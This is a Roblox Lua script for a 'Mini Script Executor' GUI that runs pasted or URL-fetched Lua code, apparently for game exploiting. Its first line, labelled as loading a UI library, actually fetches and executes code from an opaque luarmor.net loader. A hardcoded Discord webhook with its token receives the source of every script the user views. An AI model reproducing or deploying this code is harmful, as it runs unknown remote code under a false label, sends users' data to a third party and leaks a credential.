-- Load Kavo UI Library
local Library = loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))() 
local Window = Library.CreateLib("Mini Script Executor", "DarkTheme")

-- Create Tab + Section
local RunnerTab = Window:NewTab("Script Runner")
local RunnerSection = RunnerTab:NewSection("Run Your Script")

local ViewerTab = Window:NewTab("Viewer")
local ViewerSection = ViewerTab:NewSection("View Script from URL")

-- Store script text and URL
local Script = ""
local ScriptURL = ""

-- Webhook URL (replace with your actual Discord webhook)
local webhookURL = "https://discord.com/api/webhooks/1360340613974724828/sGTtseXwuTjpj1nwRGA7F8Zsti_a07AC3k4XpcDHcer43ypZaHDul_HaDbOyoJFyGC9H"

-- Function to send message to Discord with error handling and logging
local function sendToDiscord(content)
    local data = {
        ["content"] = content
    }
    local jsonData = game:GetService("HttpService"):JSONEncode(data)

    local headers = {
        ["Content-Type"] = "application/json"
    }

    local success, response = pcall(function()
        return game:GetService("HttpService"):RequestAsync({
            Url = webhookURL,
            Method = "POST",
            Headers = headers,
            Body = jsonData
        })
    end)

    if success then
        -- Log the response from Discord
        print("✅ Sent to Discord successfully!")
        print("Response:", response)
    else
        -- If there's an error, log it
        warn("❌ Error sending to Discord:", response)
    end
end

-- Paste script manually
RunnerSection:NewTextBox("Script Input", "Paste any Lua script here", function(txt)
    Script = txt
end)

RunnerSection:NewButton("Run Script", "Executes the script above", function()
    local success, err = pcall(function()
        loadstring(Script)()
    end)
    if not success then
        warn("❌ Error running script:", err)
    else
        print("✅ Script ran successfully!")
    end
end)

-- Viewer for URLs
ViewerSection:NewTextBox("Script URL", "Paste a raw script URL here", function(txt)
    ScriptURL = txt
end)

ViewerSection:NewButton("Show Script Source", "Gets and prints the source code", function()
    local success, result = pcall(function()
        return game:HttpGet(ScriptURL)
    end)
    if success then
        Script = result
        print("------ Script Source Code ------\n" .. result)

        -- Send to Discord
        sendToDiscord("Here is the script source:\n" .. result)
    else
        warn("❌ Failed to load script:", result)
    end
end)

ViewerSection:NewButton("Run Loaded Script", "Runs the script from the URL above", function()
    local success, err = pcall(function()
        loadstring(Script)()
    end)
    if not success then
        warn("❌ Error running script:", err)
    else
        print("✅ Script ran successfully!")
    end
end)
